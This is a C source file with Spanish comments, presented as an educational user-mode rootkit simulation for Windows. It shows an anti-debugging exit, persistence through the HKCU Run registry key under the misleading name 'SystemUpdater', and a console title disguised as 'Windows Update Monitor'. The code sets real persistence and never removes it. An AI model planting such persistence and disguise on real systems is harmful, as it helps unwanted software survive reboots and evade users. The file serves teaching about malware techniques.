// rootkit_sim.c
// Simulación de rootkit de modo usuario para fines educativos
// Técnicas: persistencia (registro), anti-debug, ocultamiento básico

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

#pragma comment(lib, "Advapi32.lib")

// Verifica si el proceso está siendo depurado
int is_debugged() {
    return IsDebuggerPresent();
}

// Agrega una clave al registro HKCU\Software\Microsoft\Windows\CurrentVersion\Run
void set_persistence() {
    HKEY hKey;
    const char* regPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    const char* valueName = "SystemUpdater";
    char exePath[MAX_PATH];

    // Obtiene la ruta del ejecutable actual
    GetModuleFileNameA(NULL, exePath, MAX_PATH);

    // Abre la clave de registro
    if (RegOpenKeyExA(HKEY_CURRENT_USER, regPath, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, valueName, 0, REG_SZ, (BYTE*)exePath, (DWORD)(strlen(exePath) + 1));
        RegCloseKey(hKey);
    } else {
        printf("[-] No se pudo abrir la clave del registro.\n");
    }
}

// Simula ocultamiento cambiando el título de la ventana (visible en Process Explorer)
void simulate_obfuscation() {
    SetConsoleTitleA("Windows Update Monitor");
}

// Ejecuta el binario
int main() {
    printf("[*] Iniciando rootkit_sim...\n");

    if (is_debugged()) {
        printf("[!] Depurador detectado. Saliendo.\n");
        return 1;
    }

    printf("[*] No se detectó depurador. Continuando ejecución.\n");

    set_persistence();
    simulate_obfuscation();

    printf("[*] Simulación activa. Duración: 60 segundos...\n");
    Sleep(60000);  // Mantener el proceso en ejecución para observación

    printf("[*] Finalizando.\n");
    return 0;
}
